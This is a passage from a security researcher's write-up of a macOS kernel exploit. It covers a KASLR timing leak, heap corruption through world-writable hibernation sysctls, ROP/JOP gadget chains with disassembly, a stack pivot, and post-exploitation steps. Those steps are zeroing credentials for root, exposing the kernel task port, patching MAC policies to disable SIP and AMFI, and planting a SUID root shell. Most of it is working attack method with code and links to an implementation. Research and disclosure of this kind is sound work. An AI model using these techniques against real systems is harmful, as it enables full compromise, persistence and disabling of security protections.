    0xffffff801cb00000    225     24     35     24     35     35     24     24     35     24     24     35     35     35     35     35
    0xffffff801cc00000    443     35     35     24     24     35     24     24     24     35     24     35     24     24     35     24
    0xffffff801cd00000    239     35     35     24     24     35     24     35     24     35     24     35     24     35     35     35
    0xffffff801ce00000    986     24     24     35     35     24     24     35     35     24     24     35    543    526     21     21
    0xffffff801cf00000    245     21     35     35     32     35    272     24     35     24     35     24     35     24     24     24
    0xffffff801d000000    443     24     24     24     24     24     35     24     24     35     24     35     24     24     24     24
    0xffffff801d100000    257    437     24     21     35     35     32    555    449     24     35     24     35     35     35     35
    0xffffff801d200000   1869     24     24     24     35     24     35     35     21     21     24     21     35     35     32     35
    0xffffff801d300000    239     24     32     35     35     21     21     21     32     32     24     21     32     21     24     35
    0xffffff801d400000    511     32     41     24     35     35     35     35     35     35     24     24     35     24     35     24
    0xffffff801d500000    446     24     24     35     35     24     35     24     24     24     24     24     35     35     35     35
    0xffffff801d600000    443     35   1175    440     24     21     49     35    277     35     24     35     35     32     21     35
    0xffffff801d700000    508     32     21     32     32     35     24     35     35     35     21     21     35     21     21     24
    0xffffff801d800000    443     24     35     35     21     24     35     21     24     35     24     24     35     35     21     21
    0xffffff801d900000    236     21    469     56    567    800    279     31     31     24    597    452    475     35     24     49
    0xffffff801da00000   1539     35     24     24     24     24     35     35     35     24     24     24     35     24     24     24
    0xffffff801db00000    446     35     24     24     35     24     35     35     35     35    269     35     35     21     24     24
    0xffffff801dc00000    537     35     21     35     32     24     21     35     21     35     21     24     24     32     32     21
    0xffffff801dd00000    222     24     32     21    705    298     35     35     35     24     24     24     35     35     24     24
    0xffffff801de00000    679     38     35     35     24     35     24     24     35     35     24     24     24     24     24     35
    0xffffff801df00000    228     35     35     24     35     35     24     24     35     35     24     35     24     24     35     35
    0xffffff801e000000    443     24     24     35     24     24     35     35     35     35     24     24     24     24     35     24
    0xffffff801e100000    443     24     24     35     24     24     24     35     24     35     35     35     35     35     35     24
    0xffffff801e200000    443     35   1506     35     35     35     35     35     35     24     35     24     24     24     24     35
    0xffffff801e300000    225     35     35     24     24     24     24     24     24     24     35     24     24     24     35     35
    0xffffff801e400000    454     24     35     24     35     24     24     35     35     24     35     24     35     35     35     35
    0xffffff801e500000    239     24     24     35     24     35    694    449     35     21     24     24     24     35     24     24
    0xffffff801e600000    437     35     24     24     24     35     24     35    440     24     32    440     24     35     24     24
    0xffffff801e700000   1140     24     35     24     24     24     35     24     24     35    437     35     24     32     32     21
    0xffffff801e800000    443     35     24     35     35     21     24     21     32     21     21     24     21     24     21     32
    0xffffff801e900000    236     24     32     21     32     35     21     24     32     24     24     21     24     32     24     24
    0xffffff801ea00000    443     32     35     35     21     21     35     21     35     21     21     32     35     21     32     21
    0xffffff801eb00000    225     32     21     35     21     35     24     24     32     24     24     32     35     24     24     21
    0xffffff801ec00000    437     21     21     35     35     24     35     24     24     35     24     24     21     21     32     32
    0xffffff801ed00000    222     32    579   1308     32     35     35     32     35     24     24     35     32     21     21     32
    0xffffff801ee00000    514     32     32     35     32     24     21     32     32     32     32     35     21     32     21     21
    0xffffff801ef00000    310     21    791    957     49    447     49    437     24     24     21     21     24     32     21     21
    0xffffff801f000000    821     21     21     21     32     35     24     35     35     35     35     32     24     32     24     24
    0xffffff801f100000    236     21     35     35     32     35     21     32     21     21     24     21     21     32     21     24
    0xffffff801f200000    440    236     32     32     32     21     32     24     21     35     24     21     24     32     21     32
    0xffffff801f300000    233    331     24     21     24     21     21     32     32     21     35     35     21    989    446     35
    0xffffff801f400000   1500     24     24     35     35     27    505     35     35     24     24     35     24     35     35     24
    0xffffff801f500000    242     24     24     35     24     35     35     35     24     24     35     35     24     24     35     35
    0xffffff801f600000    514     35     24     35     35    437     35     24     24     35     24     35     35     35     24     35
    0xffffff801f700000    236     24     35     24     24     24     24     35     35     35     35     35     35     24     35     24
    0xffffff801f800000   1078     35     24     35     35     24     35     35     24     24     35     24     24     35     24     35
    0xffffff801f900000    233     35     35     24     35     24     35     24     24     35     24     24     35     24     24     35
    0xffffff801fa00000    711     24     35     24     35     24     35     35     24     24     35     24     24     35     35     35
    0xffffff801fb00000    239     35     35     35     24     35     35     35     35    578    452     35     24     35     35     24
    0xffffff801fc00000    534     24    741    685   1189     49     24     24     24     24     24     35     24     24     24     24
    0xffffff801fd00000    617     35     35     24     35     24     35     24     35     35     24     35     24     35     35    443
    0xffffff801fe00000    286     35     35     35     24     24     24     24     24     24     24     35     35     35     35     35
    0xffffff801ff00000    236     24     24     24     35     24     24     35     24     35     24     35     24     35     24     35

Here the kernel base is `0xffffff800f200000`, and the difference of timings before and after is very visible. Formalising what does or does not indicate the location of the kernel base isn't trivial though, mostly due to outliers. By dull trial-and-error I have found the following procedure to be highly reliable, at least on my two machines:

1. Sort the 16 timings for each address from shortest to longest.
2. Discard all but the middle 4 values, and calculate the average over those.
3. If that value is below `50`, treat the address as mapped, otherwise treat it as unmapped.
4. Find the first block of mapped addresses large enough to contain the kernel's `__TEXT` segment.

_This is implemented in [`src/hid/kaslr.c`](https://github.com/Siguza/IOHIDeous/tree/master/src/hid/kaslr.c)._

Despite the authors of the paper stating that their attack works also in virtualised environments, I observed timings for mapped and unmapped pages to be indistinguishable on a High Sierra installation running inside VirtualBox (and that's the only VM I tried). But whatever, I've already shown that my bug can leak the kernel slide too if need be. :P

### Getting `rip` control

Back to corrupting stuff on the heap with `evg`! Since we want things from here on out to work with both ways of leaking the kernel slide, we're gonna have to to assume that we're back to not knowing the kernel address of our shared memory and not being able to read kernel memory - the only thing we can take for granted is the kernel slide. Now we're back for more, and we're here with a constraint: we want our exploit to run as fast a possible, i.e. fast enough that, on a shutdown, we'd be able to slip in between the user getting logged out and the kernel killing us.

To that end we're gonna do a single heap spray _before_ obtaining the `IOHIDUserClient` port, and then avoid any kind of bulk iteration (except final deallocation), which includes both "reading back" and reallocating. In regard to our `evg` capabilities, that eliminates all but the writing via `eventFlags` while offsetting, and that in turn requires that laying waste to the memory surrounding our target memory be not fatal. Looking again at what we can allocate on the `kalloc_map`/`kernel_map` (that is: data buffers, pointer arrays and kmsg's), the only thing that lets us do that is again a pointer array, ideally containing a single pointer surrounded by nothingness, such as e.g. demonstrated earlier with our "inflated array". This time we're gonna change two things though:

-   We're gonna use `io_service_add_notification_ool` rather than `IOSurface` to call `OSUnserializeXML` and keep the result in the kernel, because that returns us a mach port (which I'll call the "notification port"). The nice thing about that is that we can invoke its destruction with the `_kernelrpc_mach_port_deallocate_trap` mach trap, which means that we can deallocate the sprayed objects attached to it very fast, without even the need for a MIG message.
-   Instead of just one inflated array, we're gonna cram lots of them into a single port, so we can increase both allocation and deallocation efficiency, as well as decrease the overhead of whatever `io_service_add_notification_ool` is _actually_ supposed to do. Here we're limited to 4096 bytes of data we can feed to `OSUnserializeXML` (which is just a property of the MIG message defined for `io_service_add_notification_ool`), but the binary representation of an inflated array is _very_ short:

    ```c
    kOSSerializeArray | 0x3000,                             // 4 bytes for the array
    kOSSerializeEndCollection | kOSSerializeBoolean | 1,    // and 4 bytes for its content
    ```

    If we take away 4 bytes each for the mandatory magic, dictionary tag, `OSSymbol` tag, `OSSymbol` contents and `OSArray` tag (which will contain our inflated arrays), we could max this out at 509 inflated arrays per notification port! Due to later involvements however, we're not gonna drive it that far and instead leave it at a nice 256, which is still more than enough.

At that point the memory we're targeting with `evg` should have a lonely pointer to `kOSBooleanTrue` every `0x3000` bytes, and all zeroes in between which are never used by the kernel. The avid reader might notice that `0x3000` is less than the size of our shared memory, but using a size of `0x6000` wouldn't help either, because we don't know where exactly those pointers are anyway. We only know that they're at the beginning of a page-aligned buffer, but on x86 there's 3 pages in `0x3000`, which gets us back to `x`, `x + 0x1000` and `x + 0x2000` as possible locations. So even if we chose `0x6000` instead, we'd just have 6 possible locations now and trying all of them would put us over the adjacent block just the same. In order to fix that, we first have to work out some other parts of our exploit though, so let's just put that off until later.

Now, we wanna corrupt a pointer, but to where? The only thing we have is the kernel slide, and whatever we change our pointer to, it's gonna have to look at least in parts like a valid OSObject. There wouldn't just be some user-writeable memory in the kernel's __DATA segment that we could use or something, right? Turns out, there is! In [`IOHibernateIO.cpp`](https://opensource.apple.com/source/xnu/xnu-4570.1.46/iokit/Kernel/IOHibernateIO.cpp.auto.html) there is declared a `static hibernate_statistics_t _hibernateStats`, where `hibernate_statistics_t` is defined as follows:

```c
struct hibernate_statistics_t
{
    uint64_t image1Size;
    uint64_t imageSize;
    uint32_t image1Pages;
    uint32_t imagePages;
    uint32_t booterStart;
    uint32_t smcStart;
    uint32_t booterDuration;
    uint32_t booterConnectDisplayDuration;
    uint32_t booterSplashDuration;
    uint32_t booterDuration0;
    uint32_t booterDuration1;
    uint32_t booterDuration2;
    uint32_t trampolineDuration;
    uint32_t kernelImageReadDuration;

    uint32_t graphicsReadyTime;
    uint32_t wakeNotificationTime;
    uint32_t lockScreenReadyTime;
    uint32_t hidReadyTime;

    uint32_t wakeCapability;
    uint32_t resvA[15];
};
typedef struct hibernate_statistics_t hibernate_statistics_t;
```

And then, for reasons beyond my understanding, there exists this also in `IOHibernateIO.cpp`:

```c++
SYSCTL_UINT(_kern, OID_AUTO, hibernategraphicsready,
            CTLFLAG_RW | CTLFLAG_NOAUTO | CTLFLAG_KERN | CTLFLAG_ANYBODY,
            &_hibernateStats.graphicsReadyTime, 0, "");
SYSCTL_UINT(_kern, OID_AUTO, hibernatewakenotification,
            CTLFLAG_RW | CTLFLAG_NOAUTO | CTLFLAG_KERN | CTLFLAG_ANYBODY,
            &_hibernateStats.wakeNotificationTime, 0, "");
SYSCTL_UINT(_kern, OID_AUTO, hibernatelockscreenready,
            CTLFLAG_RW | CTLFLAG_NOAUTO | CTLFLAG_KERN | CTLFLAG_ANYBODY,
            &_hibernateStats.lockScreenReadyTime, 0, "");
SYSCTL_UINT(_kern, OID_AUTO, hibernatehidready,
            CTLFLAG_RW | CTLFLAG_NOAUTO | CTLFLAG_KERN | CTLFLAG_ANYBODY,
            &_hibernateStats.hidReadyTime, 0, "");
```

Well if `CTLFLAG_RW | CTLFLAG_ANYBODY` isn't an interesting combination on a global variable! In human terms, this means any process has full read-write capabilities on the struct members `graphicsReadyTime`, `wakeNotificationTime`, `lockScreenReadyTime` and `hidReadyTime`, which, oh so conveniently, lie all next to each other!

    bash$ sysctl kern.hibernategraphicsready
    kern.hibernategraphicsready: 0
    bash$ sysctl kern.hibernategraphicsready=123
    kern.hibernategraphicsready: 0 -> 123
    bash$ sysctl kern.hibernategraphicsready
    kern.hibernategraphicsready: 123

And on top of that, there's this:

```c++
SYSCTL_STRUCT(_kern, OID_AUTO, hibernatestatistics,
              CTLTYPE_STRUCT | CTLFLAG_RD | CTLFLAG_NOAUTO | CTLFLAG_KERN | CTLFLAG_LOCKED,
              &_hibernateStats, hibernate_statistics_t, "");
```

This additionally gives us readonly access to _all_ of `_hibernateStats`, which might come in handy when leaking data. Note that, like our bug, the entire facility containing these sysctl's only exists on macOS, since hibernation is not a thing on mobile devices. Also, `_hibernateStats` is not exported to the kernel's symbol table, but obtaining its address is easy enough, given that the first statement in `hibernate_machine_init()` (which _is_ exported) is a call to `bzero` on `_hibernateStats`:

```
;-- _hibernate_machine_init:
0xffffff8000867c40      55             push rbp
0xffffff8000867c41      4889e5         mov rbp, rsp
0xffffff8000867c44      4157           push r15
0xffffff8000867c46      4156           push r14
0xffffff8000867c48      4155           push r13
0xffffff8000867c4a      4154           push r12
0xffffff8000867c4c      53             push rbx
0xffffff8000867c4d      4883ec78       sub rsp, 0x78
0xffffff8000867c51      488d3d708f2a.  lea rdi, 0xffffff8000b10bc8
0xffffff8000867c58      be90000000     mov esi, 0x90
0xffffff8000867c5d      e8de748aff     call sym.___bzero
```

The address of `_hibernateStats` is pretty evidently `0xffffff8000b10bc8` in this case.

So we just made 16 bytes of writeable kernel memory whose address we can derive. At this point, let's get back to the problem we put aside earlier of how we fix the corruption of adjacent pointers when offsetting `evg`: the original pointer we're corrupting has the value `kOSBooleanTrue`, which is a location inside the `zone_map`. And the value we wanna rewrite it to is `&_hibernateStats`, which is somewhere in the kernel's `__DATA` segment. What's interesting about those two is that they aren't so far apart - the main kernel binary always resides somewhere between `0xffffff8000000000` and `0xffffff8020000000`, the `zone_map` starts at values usually lower than `0xffffff8040000000`, and since `kOSBooleanTrue` is allocated very early on, it's exceedingly likely to not be too far off from the beginning of the `zone_map`. Effectively, the addresses `kOSBooleanTrue` and `&_hibernateStats` will have the same top 32 bits, namely `0xffffff80`! For us, that means we only have to rewrite the lower 32 bits, which reduces the amount of memory we corrupt. So what memory _do_ we corrupt, exactly? We're dealing with entire page sizes, and the only thing `evg` has beyond the first page is `lleq`. Now, I've created another little program in [`data/align.c`](https://github.com/Siguza/IOHIDeous/tree/master/data/align.c) that models five pages (all but the first) each holding a pointer in the first 8 bytes, and which simulates how the initialisation of `lleq` intersects with each of these pointers. It takes a single signed int as command line argument, which is the amount of 4-byte-blocks by which `evg` is to be shifted up or down. The output is displayed as a list of all addresses where `lleq` initialisation happens, which could possibly intersect with a pointer. If intersection does indeed occur, the specific address is coloured red. Example:

[![screenshot][img7]][img7]

Here the values `0x2000`, `0x2004`, `0x5000` and `0x5004` are red, telling us that both halves of the pointers on pages 3 and 6 would be corrupted entirely if we were to align `evg->cursorSema` to the start of page 1. If we wanted to know how it looks if we align `evg->eventFlags` to the start of page 1 (which is how we'd rewrite the lower 32 bits of `kOSBooleanTrue` to `&_hibernateStats`), we'd pass `-3` as argument since we'd shift `evg` 3 times the size of a `uint32_t` backwards:

[![screenshot][img8]][img8]

Lo and behold, none of the values are red! In other words, using `eventFlags` to rewrite the first 4 bytes on a page will leave the first 8 bytes on all following pages entirely intact! We really are blessed with immense luck today!

Anyway, we can celebrate later. For now we need to come up with a way of turning our `_hibernateStats` memory into something useful. We have 16 bytes, which means exactly two pointers. Since our memory is gonna be interpreted as an `OSObject`, some 8 bytes will need to function as vtable pointer, and then we could either use the remaining 8 bytes as data and try to find a pointer in one of the kernel's constant sections that points to some code doing something useful with that data, or we could forge the "fake vtable" in a way that the remaining 8 bytes are used as the pointer to the virtual function that is invoked on our object (which is going to be `->taggedRelease()` at offset `0x50` btw, when we deallocate everything).  
The first method sounds rather hard to pull off, since the kernel is most likely only gonna contain pointers to actual functions (as opposed to useful ROP gadgets), and any virtual C++ function is out of the question anyway, since in valid `OSObjects`, bytes 9 to 12 are used for the object reference counter, which, if accessed, is only ever increased or decreased, and never exported or used in any other way.  
The second method however gets us straight to one arbitrary gadget worth of execution, which doesn't sound so bad already. It isn't enough to run arbitrary code though, for that we kinda need a place to put a ROP chain at. Our shared memory would do nicely for that, but is a single gadget enough to get its address back to userland? At least we can do this in two steps - if we find a suitabe gadget, we can corrupt one pointer in to only leak the shmem kernel address, and then in a second step corrupt another pointer to run a full ROP chain.  
But for now we can run exactly one gadget.

_This part is implemented in [`src/hid/heap.c`](https://github.com/Siguza/IOHIDeous/tree/master/src/hid/heap.c) and [`src/hid/main.c`](https://github.com/Siguza/IOHIDeous/tree/master/src/hid/main.c)._

### Turning `rip` into ROP

In order to run ROP, we need the kernel shmem address. And in order to leak that, we need to look at what values we're gonna have in registers at the time our gadget is invoked. This is gonna happen when we free everything, i.e. with a stack trace of:

    array[i]->taggedRelease()
    OSArray::flushCollection()
    OSArray::free()
    ...

Where `taggedRelease()` is an address supplied by us. So we're being called from `flushCollection()`, which looks like this:

```
;-- OSArray::flushCollection:
0xffffff800081f0d0      55             push rbp
0xffffff800081f0d1      4889e5         mov rbp, rsp
0xffffff800081f0d4      4157           push r15
0xffffff800081f0d6      4156           push r14
0xffffff800081f0d8      53             push rbx
0xffffff800081f0d9      50             push rax
0xffffff800081f0da      4989ff         mov r15, rdi
0xffffff800081f0dd      41f6471001     test byte [r15 + 0x10], 1
0xffffff800081f0e2      7427           je 0xffffff800081f10b
0xffffff800081f0e4      f6052f0a2b00.  test byte [0xffffff8000acfb1a], 4
0xffffff800081f0eb      7510           jne 0xffffff800081f0fd
0xffffff800081f0ed      488d3dedaa1c.  lea rdi, str._Trying_to_change_a_collection_in_the_registry___BuildRoot_Library_Caches_com.apple.xbs_Sources_xnu_xnu_4570.1.46_libkern_c___OSCollection.cpp:67
0xffffff800081f0f4      31c0           xor eax, eax
0xffffff800081f0f6      e8a5d9a4ff     call sym._panic
0xffffff800081f0fb      eb0e           jmp 0xffffff800081f10b
0xffffff800081f0fd      488d3d6fab1c.  lea rdi, str.Trying_to_change_a_collection_in_the_registry
0xffffff800081f104      31c0           xor eax, eax
0xffffff800081f106      e8a5ceffff     call sym._OSReportWithBacktrace
0xffffff800081f10b      41ff470c       inc dword [r15 + 0xc]
0xffffff800081f10f      41837f2000     cmp dword [r15 + 0x20], 0
0xffffff800081f114      7425           je 0xffffff800081f13b
0xffffff800081f116      31db           xor ebx, ebx
0xffffff800081f118      4c8d3511f92a.  lea r14, sym.OSCollection::gMetaClass
0xffffff800081f11f      90             nop
0xffffff800081f120      498b4718       mov rax, qword [r15 + 0x18]
0xffffff800081f124      89d9           mov ecx, ebx
0xffffff800081f126      488b3cc8       mov rdi, qword [rax + rcx*8]
0xffffff800081f12a      488b07         mov rax, qword [rdi]
0xffffff800081f12d      4c89f6         mov rsi, r14
0xffffff800081f130      ff5050         call qword [rax + 0x50]
0xffffff800081f133      ffc3           inc ebx
0xffffff800081f135      413b5f20       cmp ebx, dword [r15 + 0x20]
0xffffff800081f139      72e5           jb 0xffffff800081f120
0xffffff800081f13b      41c747200000.  mov dword [r15 + 0x20], 0
0xffffff800081f143      4883c408       add rsp, 8
0xffffff800081f147      5b             pop rbx
0xffffff800081f148      415e           pop r14
0xffffff800081f14a      415f           pop r15
0xffffff800081f14c      5d             pop rbp
0xffffff800081f14d      c3             ret
```

- `call qword [rax + 0x50]` is the code that invokes our gadget.
- `rdi` is gonna be our fake object (i.e. the address of `_hibernateStats.graphicsReadyTime`).
- `rax` is gonna be our fake vtable (i.e. the address of `_hibernateStats.lockScreenReadyTime` minus `0x50`).
- `rsi` and `r14` will be a pointer to the `OSCollection` meta class.
- `rbx` and `rcx` will be the array index of our object, i.e. `0`.
- `r15` will be a pointer to our "parent" `OSArray` object.

Ideally what we want is the address of the `OSArray`'s pointer array (because that's the one with a fixed offset from our shared memory). We can see that it is temporarily loaded into `rax` (`mov rax, qword [r15 + 0x18]`), but that register is moments later replaced with a pointer to the object's vtable. As a little excourse, that actually used to be different on Sierra, where the loop looked like this:

```
0xffffff80008377d0      89d8           mov eax, ebx
0xffffff80008377d2      498b4f18       mov rcx, qword [r15 + 0x18]
0xffffff80008377d6      488b3cc1       mov rdi, qword [rcx + rax*8]
0xffffff80008377da      488b07         mov rax, qword [rdi]
0xffffff80008377dd      4c89f6         mov rsi, r14
0xffffff80008377e0      ff5050         call qword [rax + 0x50]
0xffffff80008377e3      ffc3           inc ebx
0xffffff80008377e5      413b5f20       cmp ebx, dword [r15 + 0x20]
0xffffff80008377e9      72e5           jb 0xffffff80008377d0
```

Here the pointer array address was loaded into `rcx`, which _wasn't_ overwritten before jumping to our address. Now, gadgets dealing with `rcx` are a somewhat hard to come by, but I managed to find this little beauty:

```
0xffffff80005c0772      010f           add dword [rdi], ecx
0xffffff80005c0774      97             xchg eax, edi
0xffffff80005c0775      c3             ret
```

First of all, the `xchg eax, edi` is harmless here since `OSObject::taggedRelease` returns nothing, and we can thus treat both `rax` and `rdi` as scratch registers. So this gadget adds the lower 32 bits of the buffer address to the value already present in `_hibernateStats.graphicsReadyTime`, which is fine since we know the original value and can thus calculate the original value of `ecx`. Going back to the very beginning of this write-up and looking at some samples of where our shared memory would be mapped at under Sierra, we see the following:

    ffffff91ec867000
    ffffff91f3ec2000
    ffffff91f48f3000
    ffffff91f6a2c000
    ffffff91f828a000
    ffffff91fc02a000
    ffffff91fe160000
    ffffff91fe6b3000
    ffffff91ffc8a000
    ffffff9209150000
    ffffff92103a8000
    ffffff9211be0000
    ffffff9213141000
    ffffff9215c04000
    ffffff921a2ce000
    ffffff921bf03000

The shmem kernel address could have its upper 32 bits either `ffffff91` or `ffffff92`, but depending on that the lower 32 bits would either be very high (`0xf...`, `0xe...`) or very low (`0x0...`, `0x1...`). So after subtracting the the size we offset `evg` by from the original `ecx` value, we can simply assume that if the 31st bit is set, the upper 32 bits are `ffffff91`, otherwise they are `ffffff92` - or perform a signed integer addition, which does precisely that. :P

However, that was then and this is now. On High Sierra, we no longer get the value nicely in `rcx` anymore (and in fact we also didn't back on El Capitan). The only place we could still get it now would be directly from the `OSArray` object, i.e. `[r15 + 0x18]`. Unfortunately I did not find a gadget copying data from `[r15 + 0x18]` to an address based off `rax` or `rdi`. The outlandish thought of calling `memcpy` did cross my mind though, since there is a suitable target address in `rdi` already - we'd only have to get `r15` into `rsi` (plus or minus some bytes), and a reasonable size into `rdx` (which holds the value `1` from the invocation of `taggedRelease()` on the `OSArray` - not enough for our intentions). Surely that's not something we can achieve with just one gadget worth of execution, right? No, actually not. I mean, we get halfway there by abusing `PE_current_console()`:

```
;-- _PE_current_console:
0xffffff8000903040      55             push rbp
0xffffff8000903041      4889e5         mov rbp, rsp
0xffffff8000903044      488d35adcf1c.  lea rsi, 0xffffff8000acfff8
0xffffff800090304b      ba90000000     mov edx, 0x90
0xffffff8000903050      e8fbbf80ff     call sym._memcpy
0xffffff8000903055      31c0           xor eax, eax
0xffffff8000903057      5d             pop rbp
0xffffff8000903058      c3             ret
```

If we chip in at `mov edx, 0x90`, we get a somewhat reasonable size (we're still overflowing `_hibernateStats`, since `rdi` points to `_hibernateStats.graphicsReadyTime`, but we can deal with repairs later), which leaves only the problem of getting `r15` into `rsi`, but also creates a new problem: it pops a value off the stack before returning. If we don't push something before jumping to `0xffffff800090304b`, we're gonna panic right away when we hit that `ret`. So no matter what, we need a second gadget. And since we can actually fit two pointers into our `_hibernateStats` memory, we can sort of cheat our constraints. Recall that the reason we can run only one gadget is because we need the other pointer as fake vtable, since the code that calls us does a double dereference. But once we arrive at our gadget, we don't technically need the fake vtable any longer. If only we had a way to pause a kernel thread...

But since we're in a multithreaded system, we can actually make that happen! Say we have a gadget like `jmp [rax + 0x50]` that is first invoked like `call [rax + 0x50]` (i.e. the address is loaded from exactly the same location) - then we effectively have achieved a busy wait in kernel mode. Now all we have to do back in userland is set up an `alarm()` timer with a sufficiently high timeout before triggering that gadget, start a second thread that does nothing but continue to exist, and mask the main thread against `SIGALRM`. Then when the kernel reaches our gadget it only takes the amount of time we specified and boom, we get a `SIGALRM` sent to our second thread! Now we first switch out the address that used to be the fake vtable, and second the address our gadget is looping on, which will then immediately be executed. That now puts us at **two** gadgets worth of execution! (Actually writing a 64-bit pointer in 32-bit chunks is normally a bad idea when that value is continuously used, but given that the kernel's `__TEXT` segment is a lot smaller than `0x100000000`, we can once more leave the top 32 bits untouched and just swap out the bottom half, which happens in a single step.) Now we put `0xffffff800090304b` where our fake vtable pointer used to be, and then have to find a gadget that:

- moves `r15` to `rsi`,
- pushes exactly one value onto the stack,
- and transfers control to either `[rdi]` or `[rax + 0x48]`.

Conveniently enough, there seems to be no shortage of such gadgets:

```
0xffffff8000647067      4c89fe         mov rsi, r15
0xffffff800064706a      ff5048         call qword [rax + 0x48]
```

Alright, so we've achieved this complete function call:

```c++
memcpy(&_hibernateStats.graphicsReadyTime, osarray, 0x90);
```

Now we just have to do a `sysctlbyname("kern.hibernatestatistics")`, read the value of our pointer array from `&graphicsReadyTime + 0x18`, and with that calculate the kernel address of our shared memory. That is, one _possible_ address actually. If you recall the `x`, `x + 0x1000` and `x + 0x2000` stuff from earlier, that means we might actually be off one or two pages. But that doesn't matter much, we'll just make sure that our ROP chain fits on a single page and copy it to each of the first three pages of our shared memory. :)

To exploit that newly gained freedom, we only need to corrupt another `kOSBooleanTrue` pointer and point something to shared memory. At this point, do you remember earlier when we settled for 256 instead of 509 inflated arrays per notification port? This is where that comes into play. Since we're freeing 256 arrays at once before returning to userland, `0x3000000` bytes of memory are gone now, so we have to add at least that amount to how much we offset `evg` in order not to touch unmapped memory and cause a panic. Since the way we offset `evg` actually overlaps 12 bytes with the _previous_ allocation, and since there may be holes or other allocations on the map too, I'v chosen to double the amount I add to the offset, just to be safe. That puts us at 6MB though, which isn't so little when playing at the edge of mapped memory. Had we used 509 arrays per notification port then that value would be even higher, which might make things harder for us. 256 seems to strike a good balance.

Now at this point all that stands between us and arbitrary code execution is pivoting the stack. There just happens to exist a very nice function on x86:

```
;-- _x86_init_wrapper:
0xffffff800021c510      4831ed         xor rbp, rbp
0xffffff800021c513      4889f4         mov rsp, rsi
0xffffff800021c516      ffd7           call rdi
```

If we chip in on the second instruction, this effectively gives us a function that takes a new `rip` as first argument and a new stack pointer as second. Of course we have to load these two values from memory first, which can be conveniently achieved with the JOP gadget `OSSerializer::serialize` (I believe this was first used by [Benjamin Randazzo][benjamin] in [Trident](https://github.com/benjamin-42/Trident/blob/master/Trident/exploit.c#L82-L101)):

```
;-- OSSerializer::serialize:
0xffffff800083dad0      55             push rbp
0xffffff800083dad1      4889e5         mov rbp, rsp
0xffffff800083dad4      4889f2         mov rdx, rsi
0xffffff800083dad7      488b4720       mov rax, qword [rdi + 0x20]
0xffffff800083dadb      488b4f10       mov rcx, qword [rdi + 0x10]
0xffffff800083dadf      488b7718       mov rsi, qword [rdi + 0x18]
0xffffff800083dae3      4889cf         mov rdi, rcx
0xffffff800083dae6      5d             pop rbp
0xffffff800083dae7      ffe0           jmp rax
```

Now, since we committed to only rewriting the lower 32 bits of a pointer with `evg`, we cannot put our fake vtable pointer on shared memory since that's out of reach. Instead we'll simply put that one still in `_hibernateStats` and just _point_ it to shared memory. That leaves us with `rdi` pointing to `_hibernateStats` and only `rax` to shmem however, so we'll have to run another JOP gadget that updates `rdi` suitably:

```
0xffffff8000660621      488b7840       mov rdi, qword [rax + 0x40]
0xffffff8000660625      4c89f6         mov rsi, r14
0xffffff8000660628      ff5008         call qword [rax + 8]
```

At long last we get `rsp` pointing to shared memory and can chain gadgets to each other like we're used to.

_This is implemented in [`src/hid/main.c`](https://github.com/Siguza/IOHIDeous/tree/master/src/hid/main.c) with a gadget finder residing in [`src/hid/rop.c`](https://github.com/Siguza/IOHIDeous/tree/master/src/hid/rop.c)._

### Wreaking havoc

After all the trouble we went through to get here, it's high time to do some damage! Let's get root, bring the kernel task port to userland, install a root shell, and disable SIP and AMFI for good! :D

Getting root is trivial with ROP. We just zero out the fields `cr_uid`, `cr_ruid` and `cr_svuid` of our process' posix credentials:

```c
bzero(posix_cred_get(proc_ucred(current_proc())), 12);
```

In order to update things like e.g. our host port (to type `IKOT_HOST_PRIV`) we should also call `setuid(0)` thereafter, but we can do that from userland once we get back out of ROP.

Next up is the kernel task port, which is a bit more problematic than it used to be in the past. I explain the technical details in the [readme of my hsp4 kext](https://github.com/Siguza/hsp4#technical-background) so I'll leave them out here, but bottom line is that there's an evil pointer comparison, which we get around by means of this:

```c
mach_vm_remap(
    kernel_map,
    &remap_addr,
    sizeof(task_t),
    0,
    VM_FLAGS_ANYWHERE | VM_FLAGS_RETURN_DATA_ADDR,
    zone_map,
    kernel_task,
    false,
    &dummy,
    &dummy,
    VM_INHERIT_NONE
);
mach_vm_wire(&realhost, kernel_map, remap_addr, sizeof(task_t), VM_PROT_READ | VM_PROT_WRITE);
realhost.special[4] = ipc_port_make_send(ipc_port_alloc_special(ipc_space_kernel));
ipc_kobject_set(realhost.special[4], remap_addr, IKOT_TASK);
```

That makes it possible to obtain a working kernel task port from userland by calling `host_get_special_port(mach_host_self(), HOST_LOCAL_NODE, 4, &kernel_task)` as long as we're root. Once we have that, we can put our ROP chain to rest and carry out the rest of our plans from userland, which I generally find a lot easier.  
One last thing should better happen in ROP though: repairs. Remember when we overflowed `_hibernateStats` with our `memcpy` of `0x90` bytes? That might've corrupted things. On Sierra there doesn't seem to be anything important there so `berzo`'ing out the memory suffices. On High Sierra though, `gFSLock` sits there, and since that's a pointer to an `IOLock`, we're gonna get a panic if the kernel tries to dereference it. Luckily for us that only happens in combination with hibernation, which shouldn't occur while we're running anyway. But if we don't repair it, the machine is gonna panic then next time it is put to sleep (believe me, this was _fun_ to debug). A simple call to `IOLockAlloc` saves us all that trouble though. In the future there might also be arbitrary other things after `_hibernateStats` - you just gotta adapt to whatever you find.

With that, let's leave ROP be and go back to userland. We should have root now, so the first thing we do is that `setuid(0)` to update our host port, and then we use that to get the kernel task port. Now we wanna disable SIP and AMFI, and install a root shell. Being root, we could already put a SUID binary somewhere - but obviously we wanna put it in a cool place, like `/System/pwned`. The only thing stopping us from doing all that are MAC policies. A number of file ops prevent us from making changes in `/System`, and the NVRAM ops prevent us from setting adding `amfi_get_out_of_my_way=1` to `boot-args` which would disable AMFI, and from setting `csr-active-config` to `0x3ff` which would disable SIP, and which is required in order for `amfi_get_out_of_my_way` to be honoured. So let's just zero out all file-system- and nvram-related ops from all policies, and we're good to go.

_This is implemented in [`src/hid/rop.c`](https://github.com/Siguza/IOHIDeous/tree/master/src/hid/rop.c) (ROP chain), [`src/hid/main.c`](https://github.com/Siguza/IOHIDeous/tree/master/src/hid/main.c) (kernel patches and persistence) and [`src/helper/helper.c`](https://github.com/Siguza/IOHIDeous/tree/master/src/helper/helper.c) (root shell)._

Having achieved all that, there is nothing left for us to do but print some awesome ASCII art, and exit.

[![IOHIDeous ASCII art][img9]][img9]

## Conclusion

**Woah.**

One tiny, ugly bug. Fifteen years. Full system compromise.

A lot has changed since my last write-up, but this was again an awesome experience and a whole lot of work, and I have again learned an insane amount of new things. The move to x86 was new to me, and this time I've been dealing with a 0day rather than some public bug, but I think I can say I've managed it quite nicely. :P

